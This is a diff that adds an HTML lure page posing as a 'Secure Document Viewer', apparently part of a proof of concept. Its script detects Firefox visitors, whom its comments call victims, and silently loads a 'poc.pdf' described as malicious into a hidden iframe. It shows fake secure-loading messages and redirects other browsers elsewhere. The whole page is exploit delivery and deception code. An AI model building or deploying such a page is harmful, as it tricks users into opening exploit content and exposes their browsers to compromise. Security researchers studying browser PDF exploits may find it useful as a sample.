@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure Document Viewer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f5f5f5;
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      color: #666;
+    }
+    iframe {
+      width: 1px;
+      height: 1px;
+      border: 0;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Secure Document Viewer</h1>
+  <p>Loading your document, please wait...</p>
+
+  <script>
+    function isFirefox() {
+      return navigator.userAgent.toLowerCase().includes('firefox');
+    }
+
+    if (isFirefox()) {
+      // // Victim is Firefox => Load malicious PDF silently
+      const iframe = document.createElement('iframe');
+      iframe.src = "poc.pdf";
+      document.body.appendChild(iframe);
+
+      // Optional fake loading spinner
+      const loadingMsg = document.createElement('p');
+      loadingMsg.innerHTML = "Loading document securely...";
+      document.body.appendChild(loadingMsg);
+
+      setTimeout(() => {
+        loadingMsg.innerHTML = "If the document doesn't load, please refresh.";
+      }, 5000);
+
+    } else {
+      // // Non-Firefox users get redirected to safe page
+      window.location.href = "unsupported.html";
+    }
+  </script>
+</body>
+</html>
